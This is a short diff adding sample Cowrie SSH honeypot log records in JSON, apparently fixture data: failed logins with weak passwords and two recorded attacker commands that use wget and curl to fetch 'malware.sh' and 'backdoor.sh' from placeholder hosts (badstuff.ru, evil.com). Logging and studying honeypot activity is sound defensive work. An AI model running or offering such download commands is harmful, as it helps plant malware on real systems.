@@ -1,0 +1,7 @@
+{"eventid": "cowrie.login.failed", "username": "admin", "password": "123456", "src_ip": "92.183.123.45"}
+{"eventid": "cowrie.login.failed", "username": "root", "password": "letmein", "src_ip": "5.188.206.123"}
+{"eventid": "cowrie.command.input", "input": "wget http://badstuff.ru/malware.sh", "src_ip": "92.183.123.45"}
+{"eventid": "cowrie.command.input", "input": "curl http://evil.com/backdoor.sh", "src_ip": "92.183.123.45"}
+{"eventid": "cowrie.session.connect", "protocol": "ssh", "src_ip": "92.183.123.45", "dest_port": 2222}
+
+
